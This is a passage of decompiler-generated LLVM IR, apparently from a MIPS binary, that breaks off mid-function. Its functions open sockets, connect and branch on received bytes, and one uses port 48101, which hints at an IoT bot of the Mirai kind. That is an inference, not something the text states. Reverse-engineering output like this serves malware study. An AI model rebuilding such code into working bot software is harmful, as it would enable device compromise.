  call void @__pseudo_call(i32 %v3_400f50)
  %v0_400f64 = load i32, i32* %v0.global-to-local, align 4
  store i32 %v0_400f64, i32* %a1.global-to-local, align 4
  %v3_400f68 = load i32, i32* @global_var_449ac8.59, align 4
  store i32 %v3_400f68, i32* %t9.global-to-local, align 4
  store i32 %v2_400a78, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_400f68)
  %v3_400f80 = load i32, i32* @global_var_449b8c.51, align 4
  store i32 %v3_400f80, i32* %t9.global-to-local, align 4
  store i32 %v2_400a78, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_400f80)
  %v0_400f94 = load i32, i32* %s4.global-to-local, align 4
  store i32 %v0_400f94, i32* %a1.global-to-local, align 4
  %v3_400f98 = load i32, i32* @global_var_449ac8.59, align 4
  store i32 %v3_400f98, i32* %t9.global-to-local, align 4
  %v1_400fa0 = load i32, i32* %s1.global-to-local, align 4
  %v2_400fa0 = load i32, i32* %v0.global-to-local, align 4
  %v3_400fa0 = add i32 %v2_400fa0, %v1_400fa0
  store i32 %v3_400fa0, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_400f98)
  %v3_400fb0 = load i32, i32* @global_var_449b8c.51, align 4
  store i32 %v3_400fb0, i32* %t9.global-to-local, align 4
  store i32 %v2_400a78, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_400fb0)
  store i32 7, i32* %a0.global-to-local, align 4
  %v3_400fc8 = load i32, i32* @global_var_449c30.53, align 4
  store i32 %v3_400fc8, i32* %t9.global-to-local, align 4
  %v1_400fd0 = load i32, i32* %v0.global-to-local, align 4
  store i32 %v1_400fd0, i32* %s0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_400fc8)
  %v0_400fdc = load i32, i32* %v0.global-to-local, align 4
  store i32 %v0_400fdc, i32* %a1.global-to-local, align 4
  %v3_400fe0 = load i32, i32* @global_var_449ac8.59, align 4
  store i32 %v3_400fe0, i32* %t9.global-to-local, align 4
  %v1_400fe8 = load i32, i32* %s1.global-to-local, align 4
  %v2_400fe8 = load i32, i32* %s0.global-to-local, align 4
  %v3_400fe8 = add i32 %v2_400fe8, %v1_400fe8
  store i32 %v3_400fe8, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_400fe0)
  %v3_400ff8 = load i32, i32* @global_var_449b14.62, align 4
  store i32 %v3_400ff8, i32* %t9.global-to-local, align 4
  store i32 %v2_400a78, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_400ff8)
  %v0_40100c = load i32, i32* %v0.global-to-local, align 4
  %v1_40100c = icmp eq i32 %v0_40100c, 0
  store i32 %v0_40100c, i32* %s2.global-to-local, align 4
  br i1 %v1_40100c, label %dec_label_pc_400f4c.dec_label_pc_40101c_crit_edge, label %dec_label_pc_4011b8

dec_label_pc_400f4c.dec_label_pc_40101c_crit_edge: ; preds = %dec_label_pc_400f4c
  %v0_40101c.pre = load i32, i32* %t9.global-to-local, align 4
  br label %dec_label_pc_40101c

dec_label_pc_40101c:                              ; preds = %dec_label_pc_400f4c.dec_label_pc_40101c_crit_edge, %dec_label_pc_4011b8
  %v0_40101c = phi i32 [ %v0_40101c.pre, %dec_label_pc_400f4c.dec_label_pc_40101c_crit_edge ], [ %v3_4011d8, %dec_label_pc_4011b8 ]
  call void @__pseudo_call(i32 %v0_40101c)
  %v3_40102c = load i32, i32* @global_var_449c30.53, align 4
  store i32 %v3_40102c, i32* %t9.global-to-local, align 4
  store i32 3, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_40102c)
  %v0_401040 = load i32, i32* %v0.global-to-local, align 4
  store i32 %v0_401040, i32* %a1.global-to-local, align 4
  %v3_401044 = load i32, i32* @global_var_449ac8.59, align 4
  store i32 %v3_401044, i32* %t9.global-to-local, align 4
  store i32 %v2_400a78, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_401044)
  %v3_40105c = load i32, i32* @global_var_449b8c.51, align 4
  store i32 %v3_40105c, i32* %t9.global-to-local, align 4
  store i32 %v2_400a78, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_40105c)
  %v0_401070 = load i32, i32* %s4.global-to-local, align 4
  store i32 %v0_401070, i32* %a1.global-to-local, align 4
  %v3_401074 = load i32, i32* @global_var_449ac8.59, align 4
  store i32 %v3_401074, i32* %t9.global-to-local, align 4
  %v1_40107c = load i32, i32* %s1.global-to-local, align 4
  %v2_40107c = load i32, i32* %v0.global-to-local, align 4
  %v3_40107c = add i32 %v2_40107c, %v1_40107c
  store i32 %v3_40107c, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_401074)
  %v3_40108c = load i32, i32* @global_var_449b8c.51, align 4
  store i32 %v3_40108c, i32* %t9.global-to-local, align 4
  store i32 %v2_400a78, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_40108c)
  store i32 7, i32* %a0.global-to-local, align 4
  %v3_4010a4 = load i32, i32* @global_var_449c30.53, align 4
  store i32 %v3_4010a4, i32* %t9.global-to-local, align 4
  %v1_4010ac = load i32, i32* %v0.global-to-local, align 4
  store i32 %v1_4010ac, i32* %s0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_4010a4)
  %v0_4010b8 = load i32, i32* %v0.global-to-local, align 4
  store i32 %v0_4010b8, i32* %a1.global-to-local, align 4
  %v3_4010bc = load i32, i32* @global_var_449ac8.59, align 4
  store i32 %v3_4010bc, i32* %t9.global-to-local, align 4
  %v1_4010c4 = load i32, i32* %s1.global-to-local, align 4
  %v2_4010c4 = load i32, i32* %s0.global-to-local, align 4
  %v3_4010c4 = add i32 %v2_4010c4, %v1_4010c4
  store i32 %v3_4010c4, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_4010bc)
  %v3_4010d4 = load i32, i32* @global_var_449b8c.51, align 4
  store i32 %v3_4010d4, i32* %t9.global-to-local, align 4
  store i32 %v2_400a78, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_4010d4)
  %v0_4010e8 = load i32, i32* %s1.global-to-local, align 4
  %v1_4010e8 = load i32, i32* %v0.global-to-local, align 4
  %v2_4010e8 = add i32 %v1_4010e8, %v0_4010e8
  store i32 %v2_4010e8, i32* %a0.global-to-local, align 4
  %v3_4010f0 = load i32, i32* @global_var_449ac8.59, align 4
  store i32 %v3_4010f0, i32* %t9.global-to-local, align 4
  store i32 ptrtoint ([2 x i8]* @global_var_4084b8.71 to i32), i32* %a1.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_4010f0)
  %v3_401108 = load i32, i32* @global_var_449b8c.51, align 4
  store i32 %v3_401108, i32* %t9.global-to-local, align 4
  store i32 %v2_400a78, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_401108)
  %v0_40111c = load i32, i32* %s1.global-to-local, align 4
  %v1_40111c = load i32, i32* %v0.global-to-local, align 4
  %v2_40111c = add i32 %v1_40111c, %v0_40111c
  store i32 %v2_40111c, i32* %a0.global-to-local, align 4
  %v3_401120 = load i32, i32* @global_var_449ac8.59, align 4
  store i32 %v3_401120, i32* %t9.global-to-local, align 4
  %v1_401128 = load i32, i32* %s5.global-to-local, align 4
  %v2_401128 = add i32 %v1_401128, 11
  store i32 %v2_401128, i32* %a1.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_401120)
  store i32 %v2_400a78, i32* %a0.global-to-local, align 4
  %v3_401138 = load i32, i32* @global_var_449c14.65, align 4
  store i32 %v3_401138, i32* %t9.global-to-local, align 4
  store i32 %v2_400a88, i32* %a1.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_401138)
  %v3_401150 = load i32, i32* @global_var_449b8c.51, align 4
  store i32 %v3_401150, i32* %t9.global-to-local, align 4
  %v0_401154 = load i32, i32* %v0.global-to-local, align 4
  %v1_401154 = load i32, i32* @s7, align 4
  %v2_401154 = icmp eq i32 %v0_401154, %v1_401154
  store i32 %v2_400a88, i32* %a0.global-to-local, align 4
  br i1 %v2_401154, label %dec_label_pc_4011b8, label %dec_label_pc_401158

dec_label_pc_401158:                              ; preds = %dec_label_pc_40101c
  call void @__pseudo_call(i32 %v3_401150)
  store i32 %v2_400a88, i32* %a0.global-to-local, align 4
  %v3_40116c = load i32, i32* @global_var_449c54.57, align 4
  store i32 %v3_40116c, i32* %t9.global-to-local, align 4
  %v0_401170 = load i32, i32* %v0.global-to-local, align 4
  store i32 %v0_401170, i32* %a1.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_40116c)
  store i32 10, i32* %a1.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_4041c4.73 to i32), i32* %t9.global-to-local, align 4
  %v0_401188 = load i32, i32* %v0.global-to-local, align 4
  %v1_401188 = load i32, i32* @s7, align 4
  %v2_401188 = icmp eq i32 %v0_401188, %v1_401188
  %v3_401188 = load i32, i32* %s4.global-to-local, align 4
  store i32 %v3_401188, i32* %a0.global-to-local, align 4
  br i1 %v2_401188, label %dec_label_pc_4011b8, label %dec_label_pc_40118c

dec_label_pc_40118c:                              ; preds = %dec_label_pc_401158
  store i32 1, i32* %fp.global-to-local, align 4
  call void @__pseudo_call(i32 ptrtoint ([3 x i8]* @global_var_4041c4.73 to i32))
  %v0_40119c = load i32, i32* %v0.global-to-local, align 4
  store i32 %v0_40119c, i32* %a0.global-to-local, align 4
  %v3_4011a0 = load i32, i32* @global_var_449ba0.75, align 4
  store i32 %v3_4011a0, i32* %t9.global-to-local, align 4
  store i32 9, i32* %a1.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_4011a0)
  br label %dec_label_pc_4011b8

dec_label_pc_4011b8:                              ; preds = %dec_label_pc_400f4c, %dec_label_pc_401158, %dec_label_pc_40101c, %dec_label_pc_40118c
  %v3_4011b8 = load i32, i32* %v2_401210, align 4
  store i32 %v3_4011b8, i32* %t9.global-to-local, align 4
  %v1_4011c0 = load i32, i32* %s2.global-to-local, align 4
  store i32 %v1_4011c0, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_4011b8)
  store i32 %v2_400a78, i32* %s1.global-to-local, align 4
  %v0_4011d4 = load i32, i32* %v0.global-to-local, align 4
  store i32 %v0_4011d4, i32* %s5.global-to-local, align 4
  %v3_4011d8 = load i32, i32* @global_var_449c28.68, align 4
  store i32 %v3_4011d8, i32* %t9.global-to-local, align 4
  store i32 0, i32* %a1.global-to-local, align 4
  store i32 %v2_400a88, i32* %a0.global-to-local, align 4
  %v1_4011e8 = icmp ne i32 %v0_4011d4, 0
  store i32 -1, i32* @s7, align 4
  %v0_4011f0 = load i32, i32* %fp.global-to-local, align 4
  %v1_4011f0 = icmp eq i32 %v0_4011f0, 0
  %or.cond = and i1 %v1_4011e8, %v1_4011f0
  br i1 %or.cond, label %dec_label_pc_40101c, label %dec_label_pc_4011f8

dec_label_pc_4011f8:                              ; preds = %dec_label_pc_4011b8
  %v3_4011f8 = load i32, i32* @global_var_449a7c.76, align 4
  store i32 %v3_4011f8, i32* %t9.global-to-local, align 4
  %v1_401200 = load i32, i32* %s2.global-to-local, align 4
  store i32 %v1_401200, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_4011f8)
  br label %dec_label_pc_401210

dec_label_pc_401210:                              ; preds = %dec_label_pc_400e84, %dec_label_pc_400e6c, %dec_label_pc_4011f8
  %v3_401210 = load i32, i32* %v2_401210, align 4
  store i32 %v3_401210, i32* %t9.global-to-local, align 4
  %v1_401218 = load i32, i32* %s6.global-to-local, align 4
  store i32 %v1_401218, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_401210)
  %v0_401224 = load i32, i32* %v0.global-to-local, align 4
  %v1_401224 = icmp ne i32 %v0_401224, 0
  store i32 %v0_401224, i32* %a0.global-to-local, align 4
  %v0_40122c = load i32, i32* %fp.global-to-local, align 4
  %v1_40122c = icmp eq i32 %v0_40122c, 0
  %or.cond1 = and i1 %v1_401224, %v1_40122c
  br i1 %or.cond1, label %dec_label_pc_400e6c, label %dec_label_pc_401234

dec_label_pc_401234:                              ; preds = %dec_label_pc_401210
  %v3_401234 = load i32, i32* @global_var_449a7c.76, align 4
  store i32 %v3_401234, i32* %t9.global-to-local, align 4
  %v1_40123c = load i32, i32* %s6.global-to-local, align 4
  store i32 %v1_40123c, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_401234)
  %v3_40124c = load i32, i32* @global_var_449c00.77, align 4
  store i32 %v3_40124c, i32* %t9.global-to-local, align 4
  store i32 1, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_40124c)
  %v3_401264 = load i32, i32* @global_var_449bb8.61, align 4
  store i32 %v3_401264, i32* %t9.global-to-local, align 4
  store i32 3, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_401264)
  %v3_40127c = load i32, i32* @global_var_449bb8.61, align 4
  store i32 %v3_40127c, i32* %t9.global-to-local, align 4
  store i32 5, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_40127c)
  %v3_401294 = load i32, i32* @global_var_449bb8.61, align 4
  store i32 %v3_401294, i32* %t9.global-to-local, align 4
  store i32 7, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_401294)
  %v3_4012ac = load i32, i32* @global_var_449bb8.61, align 4
  store i32 %v3_4012ac, i32* %t9.global-to-local, align 4
  store i32 6, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_4012ac)
  %v0_4012bc = load i32, i32* %fp.global-to-local, align 4
  %v1_4012bc = mul i32 %v0_4012bc, 16777216
  %v1_4012c4 = sdiv i32 %v1_4012bc, 16777216
  store i32 %v1_4012c4, i32* %v0.global-to-local, align 4
  store i32 0, i32* %s5.global-to-local, align 4
  ret i32 %v1_4012c4

; uselistorder directives
  uselistorder i32 %v1_4012c4, { 1, 0 }
  uselistorder i32 %v0_401224, { 1, 2, 0 }
  uselistorder i32 %v3_4011d8, { 1, 0 }
  uselistorder i32* %v2_401210, { 1, 0 }
  uselistorder i32 %v3_400d10, { 1, 0 }
  uselistorder i32 %v0_400d08, { 1, 0 }
  uselistorder i32 %v1_400d2c, { 1, 0, 2 }
  uselistorder i32 %v3_400ce4, { 1, 0 }
  uselistorder i32 %v0_400cf418, { 1, 0 }
  uselistorder i32 %v0_400cc4, { 1, 0 }
  uselistorder i32 %v0_400cf420, { 1, 0 }
  uselistorder i32 %v2_400cec, { 2, 3, 0, 1 }
  uselistorder i32 %v0_400cc413, { 3, 4, 2, 1, 0 }
  uselistorder i32 %v4_400c18, { 1, 0 }
  uselistorder i32 %v3_400c10, { 1, 0 }
  uselistorder i32 %v0_400c08, { 1, 0 }
  uselistorder i32 %v2_400bfc, { 1, 0, 2, 3 }
  uselistorder i32 %v1_400bf8, { 1, 2, 0, 3 }
  uselistorder i32 %v4_400bec, { 1, 0 }
  uselistorder i32 %v3_400bec, { 0, 1, 3, 2 }
  uselistorder i32 %v2_400ab8, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_400aa0, { 3, 0, 1, 2, 4, 5 }
  uselistorder i32* %v1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9, 11 }
  uselistorder i32* %v0.global-to-local, { 0, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 20, 21, 1, 22, 23, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 24, 25, 26, 27 }
  uselistorder i32* %t9.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 64, 65, 66, 67, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63 }
  uselistorder i32* %s5.global-to-local, { 3, 0, 1, 2 }
  uselistorder i32* %s1.global-to-local, { 0, 8, 9, 10, 11, 12, 13, 14, 15, 16, 1, 4, 2, 3, 5, 6, 7 }
  uselistorder i32* %fp.global-to-local, { 3, 2, 1, 0, 4, 5 }
  uselistorder i32* %a1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 32, 33, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31 }
  uselistorder i32* %a0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 20, 19, 21, 23, 22, 24, 25, 26, 28, 27, 29, 31, 30, 32, 33, 34, 35, 36, 37, 39, 38, 72, 73, 74, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71 }
  uselistorder label %dec_label_pc_401210, { 2, 0, 1 }
  uselistorder label %dec_label_pc_4011b8, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_40101c, { 1, 0 }
  uselistorder label %dec_label_pc_400e64, { 1, 0 }
  uselistorder label %dec_label_pc_400e28, { 1, 0 }
  uselistorder label %dec_label_pc_400d70, { 5, 2, 3, 4, 0, 1 }
  uselistorder label %dec_label_pc_400d24, { 1, 0 }
  uselistorder label %dec_label_pc_400cdc, { 1, 0 }
  uselistorder label %dec_label_pc_400cc4, { 1, 0 }
  uselistorder label %dec_label_pc_400cc0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_400cb8, { 1, 0 }
  uselistorder label %dec_label_pc_400c24, { 1, 0 }
  uselistorder label %dec_label_pc_400bd4, { 1, 0 }
  uselistorder label %dec_label_pc_400b30, { 1, 0 }
}

define i32 @function_4012f8() local_unnamed_addr {
dec_label_pc_4012f8:
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  store i32 1, i32* @s3, align 4
  %v3_401324 = load i32, i32* @global_var_449bf4.78, align 4
  store i32 %v3_401324, i32* @t9, align 4
  %v4_401334 = call i32 @function_405f50(i32 2, i32 2, i32 0)
  store i32 1, i32* @s1, align 4
  %v3_401348 = load i32, i32* @global_var_449b84.79, align 4
  store i32 %v3_401348, i32* @t9, align 4
  %v2_401350 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_401350, i32* @a3, align 4
  %v2_40135c = icmp eq i32 %v4_401334, -1
  store i32 %v4_401334, i32* @global_var_449824.6, align 4
  br i1 %v2_40135c, label %dec_label_pc_40142c, label %dec_label_pc_401360

dec_label_pc_401360:                              ; preds = %dec_label_pc_4012f8
  store i32 1, i32* %stack_var_-48, align 4
  %v11_40136c = call i32 @function_405ed0(i32 %v4_401334, i32 65535, i32 4, i32* nonnull %stack_var_-48, i32 4)
  %v3_401378 = load i32, i32* @global_var_449824.6, align 4
  store i32 %v3_401378, i32* @s0, align 4
  %v3_40137c = load i32, i32* @global_var_449a74.80, align 4
  store i32 %v3_40137c, i32* @t9, align 4
  store i32 %v3_401378, i32* @a0, align 4
  store i32 3, i32* @a1, align 4
  %v1_401388 = call i32 @function_404bc0()
  %v0_401394 = load i32, i32* @s0, align 4
  store i32 %v0_401394, i32* @a0, align 4
  %v3_401398 = load i32, i32* @global_var_449a74.80, align 4
  store i32 %v3_401398, i32* @t9, align 4
  store i32 4, i32* @a1, align 4
  %v1_4013a0 = call i32 @function_404bc0()
  %v0_4013b0 = load i32, i32* @s3, align 4
  %v1_4013b0 = load i32, i32* @s1, align 4
  %v2_4013b0 = icmp eq i32 %v0_4013b0, %v1_4013b0
  br i1 %v2_4013b0, label %dec_label_pc_4013c4, label %dec_label_pc_4013b4

dec_label_pc_4013b4:                              ; preds = %dec_label_pc_401360
  br label %dec_label_pc_4013c4

dec_label_pc_4013c4:                              ; preds = %dec_label_pc_401360, %dec_label_pc_4013b4
  %v3_4013c8 = load i32, i32* @global_var_449abc.83, align 4
  store i32 %v3_4013c8, i32* @t9, align 4
  store i32 2, i32* %stack_var_-44, align 4
  %v6_4013d8 = call i32 @function_4056e0()
  %v1_4013e4 = inttoptr i32 %v6_4013d8 to i32*
  store i32 0, i32* %v1_4013e4, align 4
  %v3_4013e8 = load i32, i32* @global_var_4499c8.2, align 4
  store i32 %v3_4013e8, i32* @s1, align 4
  %v3_4013ec = load i32, i32* @global_var_449b98.84, align 4
  store i32 %v3_4013ec, i32* @t9, align 4
  %v3_4013f4 = load i32, i32* @global_var_449824.6, align 4
  store i32 %v6_4013d8, i32* @s0, align 4
  %v5_401400 = bitcast i32* %stack_var_-44 to %sockaddr*
  %v6_401400 = call i32 @function_405b90(i32 %v3_4013f4, %sockaddr* %v5_401400, i32 16)
  %v1_40140c = icmp eq i32 %v6_401400, 0
  br i1 %v1_40140c, label %dec_label_pc_4013c4.dec_label_pc_401448_crit_edge, label %dec_label_pc_401410

dec_label_pc_4013c4.dec_label_pc_401448_crit_edge: ; preds = %dec_label_pc_4013c4
  %v0_401448.pre = load i32, i32* @s3, align 4
  br label %dec_label_pc_401448

dec_label_pc_401410:                              ; preds = %dec_label_pc_4013c4
  %v0_401414 = load i32, i32* @s0, align 4
  %v1_401414 = inttoptr i32 %v0_401414 to i32*
  %v2_401414 = load i32, i32* %v1_401414, align 4
  %v2_40141c = icmp eq i32 %v2_401414, 126
  br i1 %v2_40141c, label %dec_label_pc_40142c, label %dec_label_pc_401420

dec_label_pc_401420:                              ; preds = %dec_label_pc_401410
  %v2_401424 = icmp eq i32 %v2_401414, 13
  br i1 %v2_401424, label %dec_label_pc_40142c, label %dec_label_pc_401474

dec_label_pc_40142c:                              ; preds = %dec_label_pc_401420, %dec_label_pc_401410, %dec_label_pc_4012f8
  %v0_40142c = load i32, i32* @s3, align 4
  %v1_40142c = add i32 %v0_40142c, 1
  %v1_401430 = urem i32 %v1_40142c, 256
  %v2_401438 = icmp eq i32 %v1_401430, 3
  br i1 %v2_401438, label %dec_label_pc_4014f8, label %dec_label_pc_401448

dec_label_pc_401448:                              ; preds = %dec_label_pc_4013c4.dec_label_pc_401448_crit_edge, %dec_label_pc_40142c
  %v0_401448 = phi i32 [ %v0_401448.pre, %dec_label_pc_4013c4.dec_label_pc_401448_crit_edge ], [ %v1_401430, %dec_label_pc_40142c ]
  %v1_401448 = icmp ult i32 %v0_401448, 2
  %v1_40144c = icmp eq i1 %v1_401448, false
  br i1 %v1_40144c, label %dec_label_pc_4014f4, label %dec_label_pc_401450

dec_label_pc_401450:                              ; preds = %dec_label_pc_401448
  %v3_401454 = load i32, i32* @global_var_449b54.85, align 4
  store i32 %v3_401454, i32* @t9, align 4
  %v0_401458 = load i32, i32* @s1, align 4
  %v1_401458 = add i32 %v0_401458, -26588
  %v2_401458 = inttoptr i32 %v1_401458 to i32*
  %v3_401458 = load i32, i32* %v2_401458, align 4
  %v3_40145c = call i32 @function_405d30(i32 %v3_401458, i32 1)
  br label %dec_label_pc_401474

dec_label_pc_401474:                              ; preds = %dec_label_pc_401420, %dec_label_pc_401450
  %v3_401474 = load i32, i32* @global_var_449c60.86, align 4
  store i32 %v3_401474, i32* @t9, align 4
  %v0_401478 = load i32, i32* @s1, align 4
  %v1_401478 = add i32 %v0_401478, -26588
  %v2_401478 = inttoptr i32 %v1_401478 to i32*
  %v3_401478 = load i32, i32* %v2_401478, align 4
  store i32 16, i32* @a2, align 4
  %v4_40147c = call i32 @function_405bf0(i32 %v3_401478, %sockaddr* inttoptr (i32 16 to %sockaddr*))
  store i32 %v4_40147c, i32* @v0, align 4
  %v3_40148c = load i32, i32* @global_var_449c00.77, align 4
  store i32 %v3_40148c, i32* @t9, align 4
  %v2_401494 = call i32 @function_4068f0(i32 5)
  %v0_4014a0 = load i32, i32* @s1, align 4
  %v1_4014a0 = add i32 %v0_4014a0, -26588
  %v2_4014a0 = inttoptr i32 %v1_4014a0 to i32*
  %v3_4014a0 = load i32, i32* %v2_4014a0, align 4
  %v3_4014a4 = load i32, i32* @global_var_449a6c.60, align 4
  store i32 %v3_4014a4, i32* @t9, align 4
  %v2_4014ac = call i32 @function_404d20(i32 %v3_4014a0)
  store i32 %v2_4014ac, i32* @v0, align 4
  %v3_4014bc = load i32, i32* @global_var_449c1c.87, align 4
  store i32 %v3_4014bc, i32* @t9, align 4
  %v2_4014c4 = call i32 @function_400a30(i32 48101)
  %v3_4014d4 = load i32, i32* @global_var_4499d0.88, align 4
  %v1_4014dc = add i32 %v3_4014d4, 4856
  call void @__pseudo_call(i32 %v1_4014dc)
  br label %dec_label_pc_4014f4

dec_label_pc_4014f4:                              ; preds = %dec_label_pc_401448, %dec_label_pc_401474
  br label %dec_label_pc_4014f8

dec_label_pc_4014f8:                              ; preds = %dec_label_pc_40142c, %dec_label_pc_4014f4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_401430, { 1, 0 }
  uselistorder i32 %v4_401334, { 0, 2, 1 }
  uselistorder i32 13, { 1, 0, 2 }
  uselistorder label %dec_label_pc_4014f8, { 1, 0 }
  uselistorder label %dec_label_pc_4014f4, { 1, 0 }
  uselistorder label %dec_label_pc_401474, { 1, 0 }
  uselistorder label %dec_label_pc_401448, { 1, 0 }
  uselistorder label %dec_label_pc_4013c4, { 1, 0 }
}

define i32 @function_401514(i32* %arg1) local_unnamed_addr {
dec_label_pc_401514:
  %a1.global-to-local = alloca i32, align 4
  %gp.global-to-local = alloca i32, align 4
  %s1.global-to-local = alloca i32, align 4
  %s5.global-to-local = alloca i32, align 4
  %v0.global-to-local = alloca i32, align 4
  %v1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %a1.global-to-local, align 4
  %stack_var_-1380 = alloca i32, align 4
  %stack_var_-1376 = alloca i32, align 4
  %stack_var_-1372 = alloca i32, align 4
  %stack_var_-1384 = alloca i16, align 2
  %stack_var_-1364 = alloca i32, align 4
  %stack_var_-1060 = alloca i32, align 4
  %stack_var_-1188 = alloca i32, align 4
  %stack_var_-1316 = alloca i32, align 4
  %stack_var_-1348 = alloca i32, align 4
  %v1_40151c = load i32, i32* @t9, align 4
  %v2_40151c = add i32 %v1_40151c, 328860
  store i32 %v2_40151c, i32* %gp.global-to-local, align 4
  %v0_40153c = load i32, i32* @s1, align 4
  %v3_401548 = load i32, i32* @global_var_449b60.89, align 4
  store i32 %v3_401548, i32* @t9, align 4
  %v2_40154c = load i32, i32* %arg1, align 4
  %v3_401550 = load i32, i32* @global_var_4499cc.8, align 4
  store i32 %v3_401550, i32* @s1, align 4
  %v2_401554 = inttoptr i32 %v2_40154c to i8*
  %v3_401554 = call i32 @function_405250(i8* %v2_401554)
  store i32 %v3_401554, i32* %v0.global-to-local, align 4
  store i32 %v2_40151c, i32* %gp.global-to-local, align 4
  store i32 1, i32* %a1.global-to-local, align 4
  %v3_401564 = load i32, i32* @global_var_449b70.18, align 4
  store i32 %v3_401564, i32* @t9, align 4
  %v3_40156c = call i32 @function_405fb0(i32 18, i32 1)
  store i32 %v3_40156c, i32* %v0.global-to-local, align 4
  store i32 %v2_40151c, i32* %gp.global-to-local, align 4
  %v3_40157c = load i32, i32* @global_var_449a68.90, align 4
  store i32 %v3_40157c, i32* @t9, align 4
  %v1_401584 = call i32 @function_4006d0()
  store i32 %v1_401584, i32* %v0.global-to-local, align 4
  store i32 %v2_40151c, i32* %gp.global-to-local, align 4
  %v3_401598 = load i32, i32* @global_var_449b88.91, align 4
  store i32 %v3_401598, i32* @t9, align 4
  %v5_4015a0 = call i32 @function_404cc0(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_4084b8.71, i32 0, i32 0))
  store i32 %v5_4015a0, i32* %v0.global-to-local, align 4
  store i32 %v2_40151c, i32* %gp.global-to-local, align 4
  %v3_4015b0 = load i32, i32* @global_var_449c3c.92, align 4
  store i32 %v3_4015b0, i32* @t9, align 4
  %v1_4015b8 = call i32 @function_404448()
  store i32 %v1_4015b8, i32* %v0.global-to-local, align 4
  store i32 %v2_40151c, i32* %gp.global-to-local, align 4
  %v3_4015c8 = load i32, i32* @global_var_449c40, align 4
  store i32 %v3_4015c8, i32* %v1.global-to-local, align 4
  %v3_4015cc = load i32, i32* @global_var_4499d0.88, align 4
  %v1_4015d4 = add i32 %v3_4015cc, 4856
  store i32 4199904, i32* @ra, align 4
  %v3_4015d8 = inttoptr i32 %v3_4015c8 to i32*
  store i32 %v1_4015b8, i32* %v3_4015d8, align 4
  call void @__pseudo_call(i32 %v1_4015d4)
  store i32 %v2_40151c, i32* %gp.global-to-local, align 4
  %v1_4015e4 = icmp eq i32 %v1_4015b8, 0
  br i1 %v1_4015e4, label %dec_label_pc_4015e8, label %dec_label_pc_4016a4

dec_label_pc_4015e8:                              ; preds = %dec_label_pc_401514
  %v3_4015ec = load i32, i32* @global_var_449b08.52, align 4
  store i32 %v3_4015ec, i32* @t9, align 4
  %v2_4015f4 = call i32 @function_4002d0(i32 2)
  store i32 %v2_4015f4, i32* %v0.global-to-local, align 4
  store i32 %v2_40151c, i32* %gp.global-to-local, align 4
  %v3_401604 = load i32, i32* @global_var_449c30.53, align 4
  store i32 %v3_401604, i32* @t9, align 4
  %v2_40160c = call i32 @function_400564(i32 2)
  store i32 %v2_40160c, i32* %v0.global-to-local, align 4
  store i32 %v2_40151c, i32* %gp.global-to-local, align 4
  %v3_40161c = load i32, i32* @global_var_449c30.53, align 4
  store i32 %v3_40161c, i32* @t9, align 4
  store i32 %v2_40160c, i32* @s0, align 4
  %v3_401624 = call i32 @function_400564(i32 2)
